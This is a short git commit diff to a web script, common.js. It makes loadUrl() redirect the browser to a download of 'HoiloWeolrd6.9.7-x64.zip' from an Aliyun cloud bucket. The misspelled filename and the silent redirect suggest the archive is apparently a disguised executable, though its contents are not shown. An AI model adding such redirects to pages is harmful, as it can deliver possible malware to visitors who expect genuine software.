9d388a7255368ef41d8775879248e5d02952c131
awghwaa <doimk47thu8176@gmail.com>
2025-08-18 10:54:01 +0800

    Add files via upload

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="";
+		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
 		window.location=url;
 	}
 }
@@ -11,6 +11,4 @@ var num=0;
 function getLoad()
 {
 	num++;
-
 }
-
